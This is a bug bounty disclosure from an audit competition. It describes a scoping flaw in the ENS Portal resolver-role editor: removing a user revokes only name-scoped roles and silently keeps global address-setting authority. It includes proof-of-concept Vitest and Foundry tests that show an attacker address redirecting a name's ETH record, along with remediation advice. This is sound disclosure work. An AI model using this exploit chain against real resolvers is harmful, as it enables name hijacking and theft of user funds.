# 91757 w a critical resolver role aggregation mis scopes removal and preserves global authority

**Submitted on Sep 4th 2026 at 06:03:19 UTC by @Orellasec for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91757
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user funds
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The Explorer groups resolver-role rows only by account, merging role bitmaps from different EAC resources (root and individual names). The edit sidebar then reconstructs one transaction scope from resolved display names instead of preserving the role row's actual resource. A mixed root/name row is presented as “Global roles (all names),” but “Remove user from all roles” targets the first non-root name and silently leaves the account's root roles active. A retained root ROLE\_SET\_ADDR holder can redirect a victim name's ETH address record to itself, enabling name hijacking and theft of transfers sent through the name.

## Vulnerability Details

1. groupRolesByAccount keys only on the lower-cased account. When another row for that account is seen, it appends both the raw role row and decoded bitmap without retaining resource boundaries in the editable representation.
2. If any merged resource is root, the sidebar tells the administrator the row contains “Global roles (all names).”
3. Nevertheless, roleName selects the first name that is not (root).
4. Both Save and Remove pass that reconstructed string together with the union of all decoded roles.
5. Grant/revoke helpers map the empty string to root and a non-empty string to that name. Neither path preserves the original role resource.

An administrator can therefore click the explicit destructive “Remove user from all roles” action and sign a transaction that succeeds, yet revokes only name-scoped roles. The root role remains untouched.

Relevant audited source:

* apps/portal/src/lib/roles/resolverRoles.ts:179-220
* apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-193,251-276,295-321,391-396,441-447
* apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-60
* apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-60

## Impact Details

The selected in-scope impacts are direct theft of user funds and incorrect address/name details, including resolving ENS to an attacker-controlled address.

With retained root ROLE\_SET\_ADDR, the supposedly removed account can later change the ETH address record for any name using that resolver. Users relying on ENS resolution can then transfer assets to the attacker's address. Other retained root roles can similarly alter text/contenthash/ABI data, clear records, create aliases, or upgrade the resolver according to the role bitmap.

The prerequisite is realistic: an account may have a global operational role and a narrower per-name role, or role scope can accumulate over time. The UI explicitly supports both root and name-scoped grants on the same resolver.

## Remediation

Do not aggregate editable rows solely by account. Key editable groups by (account, resource) and preserve the exact resource through display, diffing, confirmation, and calldata construction.

For “Remove user from all roles,” enumerate every raw roles entry and issue a revocation for each exact resource (or use a contract-supported batch). The confirmation and transaction modal should list all resources. Add regression tests for an account holding roles at root plus one or more name resources.

## Known-Issue Distinction

QA-01 covers errors in follow-up profile and primary-name actions after certain role combinations during name transfer. The competition disclosure classifies that as functional breakage and states that a demonstrated security consequence—such as a role combination granting unintended authority—is a new finding. This report neither requires a transfer nor depends on either listed follow-up action. Its root is the resolver-role editor collapsing simultaneous root and name resources into one account row and then signing a revocation for only one reconstructed resource. The transaction succeeds while silently preserving global authority, which the real resolver PoC uses to change the victim's address record. That root, successful-but-incomplete revocation, and retained-authority consequence are not described by QA-01.

## Source Identity

* Audit mirror commit: cda79acaad59711b943fc68207ebb3f1d0ff8596
* Audited upstream identity: 63772fd872af472ced58b009499355f3430c2a86

## Proof of Concept

## Proof of Concept

This PoC composes the shipped Portal UI and transaction builder with the real pinned PermissionedResolver. It does not model the vulnerable behavior in a standalone helper.

### Prerequisites

* Use audit mirror commit cda79acaad59711b943fc68207ebb3f1d0ff8596.
* Use contracts-v2 PR checkout at audited upstream identity 63772fd872af472ced58b009499355f3430c2a86.
* Node.js 22, pnpm 10.27.0, and Foundry forge.

### Step 1 — reproduce the mixed-resource UI row

Create a Vitest beside ResolverRolesSidebar.tsx. Build resourceToName with alice.eth and call the shipped groupRolesByAccount with these two real role records for the same account:

* resource 0x00…00, roleBitmap ROLE\_SET\_ADDR
* resource computeNameResource('alice.eth'), roleBitmap ROLE\_SET\_TEXT

Render the shipped ResolverRolesSidebar with groups\[0], then execute the actual Remove user -> Remove -> Execute prepared transaction flow. Mock only the wallet/transaction transport so the test can capture the production revokeResolverRoles invocation.

Assert both of the following:

1. The component renders “Global roles (all names)”.
2. revokeResolverRoles is called with name alice.eth, the target account, and roles \[ROLE\_SET\_ADDR, ROLE\_SET\_TEXT].

This proves the UI announces global scope but reconstructs and submits a name-scoped removal.

Run:

```
cd apps/portal
npx --yes pnpm@10.27.0 exec vitest run src/features/resolver/components/ResolverRolesSidebar.poc.test.tsx
```

Expected:

```
Test Files 1 passed (1)
Tests 1 passed (1)
```

### Step 2 — decode the shipped transaction builder's calldata

In a second Vitest, call the shipped prepareRevokeResolverRolesTransaction with:

```
resolverAddress = 0x1111111111111111111111111111111111111111
name = alice.eth
account = 0x2222222222222222222222222222222222222222
roles = [ROLE_SET_ADDR, ROLE_SET_TEXT]
chainId = 11155111
```

Decode intent.request.data using permissionedResolverAuthorizeNameRolesSnippet and assert:

```
functionName == authorizeNameRoles
args == [
  0x05616c6963650365746800,
  ROLE_SET_ADDR | ROLE_SET_TEXT,
  account,
  false
]
```

Run:

```
npx --yes pnpm@10.27.0 exec vitest run src/features/resolver/helpers/ResolverRoleScopeCalldata.poc.test.ts
```

Expected:

```
Test Files 1 passed (1)
Tests 1 passed (1)
```

### Step 3 — execute that exact removal against the real resolver

Save the following as contracts/test/PORTAL003RealPoC.t.sol in the contracts-v2 checkout:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
import {EACBaseRolesLib} from "../src/access-control/libraries/EACBaseRolesLib.sol";
import {PermissionedResolver} from "../src/resolver/PermissionedResolver.sol";

contract PORTAL003RealPoCTest is Test {
    uint256 internal constant ROLE_SET_ADDR = 1 << 0;
    uint256 internal constant ROLE_SET_TEXT = 1 << 4;

    PermissionedResolver internal resolver;
    address internal attacker = address(0xBADD1E);

    function setUp() public {
        VerifiableFactory factory = new VerifiableFactory();
        PermissionedResolver implementation = new PermissionedResolver(address(0xBEEF));
        bytes[] memory setters = new bytes[](0);
        bytes memory initData = abi.encodeCall(
            PermissionedResolver.initialize,
            (address(this), EACBaseRolesLib.ALL_ROLES, setters)
        );
        resolver = PermissionedResolver(
            factory.deployProxy(address(implementation), 1, initData)
        );
    }

    function testNameScopedRemovalLeavesGlobalAddressAuthorityUsable() public {
        bytes memory aliceName = hex"05616c6963650365746800";
        bytes32 aliceNode = NameCoder.namehash(aliceName, 0);

        // Same account holds one root role and one alice.eth role.
        resolver.authorizeNameRoles(hex"00", ROLE_SET_ADDR, attacker, true);
        resolver.authorizeNameRoles(aliceName, ROLE_SET_TEXT, attacker, true);

        // Exact resource and bitmap produced by the shipped Portal helper.
        resolver.authorizeNameRoles(
            aliceName,
            ROLE_SET_ADDR | ROLE_SET_TEXT,
            attacker,
            false
        );

        // The supposedly removed account still has root ROLE_SET_ADDR.
        address stolenRecipient = address(0xBAD);
        vm.prank(attacker);
        resolver.setAddr(aliceNode, stolenRecipient);

        assertEq(resolver.addr(aliceNode), stolenRecipient);
    }
}
```

Run:

```
forge test --match-path test/PORTAL003RealPoC.t.sol -vvv
```

Expected:

```
[PASS] testNameScopedRemovalLeavesGlobalAddressAuthorityUsable()
```

### Result

The three linked tests establish one continuous production-reachable chain:

1. The actual component merges root and alice.eth resources and tells the admin the row is global.
2. Its actual removal flow calls the shipped helper with alice.eth and the union bitmap.
3. The shipped helper encodes authorizeNameRoles(alice.eth, unionBitmap, account, false).
4. Executing those exact semantics on the real PermissionedResolver leaves root ROLE\_SET\_ADDR active.
5. The supposedly removed account then calls the real resolver and redirects alice.eth to an attacker-controlled address.

Combined expected summary from the packaged runner:

```
Test Files 2 passed (2); Tests 2 passed (2)
[PASS] testNameScopedRemovalLeavesGlobalAddressAuthorityUsable()
```
